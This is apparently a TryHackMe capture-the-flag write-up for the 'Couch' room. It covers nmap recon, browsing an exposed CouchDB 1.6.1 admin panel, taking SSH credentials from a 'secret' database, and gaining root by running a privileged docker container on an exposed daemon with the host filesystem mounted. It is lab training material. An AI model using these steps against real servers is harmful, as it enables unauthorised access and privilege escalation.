---
title: TryHackMe Couch
date: 2021-07-09T19:22:00+05:30
lastmod: 2021-07-09T19:22:46+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
#cover: /img/blog.png
cover:
  image: /img/thm.gif
  alt: "cover image"

categories:
  - TryHackMe
tags:
  - tryhackme
  - rooms
  - thm
  - couch

draft: false
description: TryHackMe Room couch solved by Animesh Roy. this is a walkthough. Hack into a vulnerable database server that collects and stores data in JSON-based document formats, in this semi-guided challenge.

---

## Couch

## Flags

|Task|Remarks|
|---|---|
|1.1|[flag](#recon)|

---

### Recon

running nmap: (Default)

```bash
┌──(anir0y㉿kali)-[~/share/thm/room/couch]
└─$ sudo nmap -sC -sV -oN nmap/couch 10.10.94.40
[sudo] password for anir0y: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-09 19:26 IST
Nmap scan report for 10.10.94.40
Host is up (0.21s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:9d:39:09:34:30:4b:3d:a7:1e:df:eb:a3:b0:e5:aa (RSA)
|   256 a4:2e:ef:3a:84:5d:21:1b:b9:d4:26:13:a5:2d:df:19 (ECDSA)
|_  256 e1:6d:4d:fd:c8:00:8e:86:c2:13:2d:c7:ad:85:13:9c (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.79 seconds
```

Nmap All ports:

```bash
┌──(anir0y㉿kali)-[~/share/thm/room/couch]
└─$ sudo nmap -p - -oN nmap/all-ports 10.10.94.40 -T4                        130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-09 19:39 IST
Nmap scan report for 10.10.94.40
Host is up (0.15s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5984/tcp open  couchdb

Nmap done: 1 IP address (1 host up) scanned in 408.20 seconds
```

### 1.2

What is the database management system installed on the server?

```zsh
┌──(anir0y㉿kali)-[~/share/thm/room/couch]
└─$ sudo nmap -sC -sV -oN nmap/5984 10.10.94.40 -p 5984
...[snip]...

PORT     STATE SERVICE VERSION
5984/tcp open  http    CouchDB httpd 1.6.1 (Erlang OTP/18)
|_http-server-header: CouchDB/1.6.1 (Erlang OTP/18)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).

```

### 1.3

What port is the database management system running on?

ans is in nmap scan results [Recon](#recon)

### 1.4

What is the version of the management system installed on the server?

Ans is [here?](#13)

### 1.5

What is the path for the web administration tool for this database management system?

Browsing to `http://MACHINE_IP:5984/` gives us the following JSON message:

```zsh
{"couchdb":"Welcome","uuid":"ef680bb740692240059420b2c17db8f3","version":"1.6.1","vendor":{"version":"16.04","name":"Ubuntu"}}
```

It seems like we can browse the contents of the database server a bit in our browser. If you search on the web on
CouchDB, you will find that the _utils URL will bring the user to the admin panel. Browse to `http://MACHINE_IP:5984/_utils` to see the following web page

![IMG](https://i.imgur.com/UCA3PP5.png)

### 1.6

What is the path to list all databases in the web browser of the database management system?

![img](https://i.imgur.com/mX6dgqb.png)

---
<!-- Google Ads -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->

---

### 1.7

looing in to `db` we found a database named `secret` the content of this DB reveals the creds:

![img](https://i.imgur.com/OHwjid1.png)

### 1.8

using the found creds, we can `SSH` into the box

```zsh
┌──(anir0y㉿kali)-[~/share/thm/room/couch]
└─$ ssh atena@10.10.94.40
The authenticity of host '10.10.94.40 (10.10.94.40)' can't be established.
ECDSA key fingerprint is SHA256:TtfUUNS6Ivob4iQ7X414863lCCc1q2YyzzycIkRTZ3k.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.94.40' (ECDSA) to the list of known hosts.
atena@10.10.94.40's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-193-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Fri Dec 18 15:25:27 2020 from 192.168.85.1
atena@ubuntu:~$ cat user.txt 
THM{FLAG-Content}
```

### 1.9

Do manual enumeration - check the following for Privilege Escalation:

- Sudo Permissions
- SUID binaries
- Cron Jobs
- Backup files
- History files
- Config files
- Running Processes (ps aux)

By checking the bash history file:

```zsh
atena@ubuntu:~$ cat .bash_history 
[..snip..]
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
[..snip..]
```

Docker sounds intresting, let's see what we can get with it. turns out this mounts the `/` dir of host system in docker `/mnt` location. once you understand this. rest are just starting the docker image, and start looking. I use `find` command to help me here.

* Run docker in privileged mode, to get root access
  
```bash
atena@ubuntu:~$ docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
```

### Root.txt

```bash
~ # find / -name root.txt 
/mnt/root/root.txt

~ # cat /mnt/root/root.txt
THM{REDACTED}
```

---
<!-- Google Ads -->

<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->


<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="anir0y" data-description="Support me on Buy me a coffee!" data-message="" data-color="#5F7FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

<!-- EOF -->
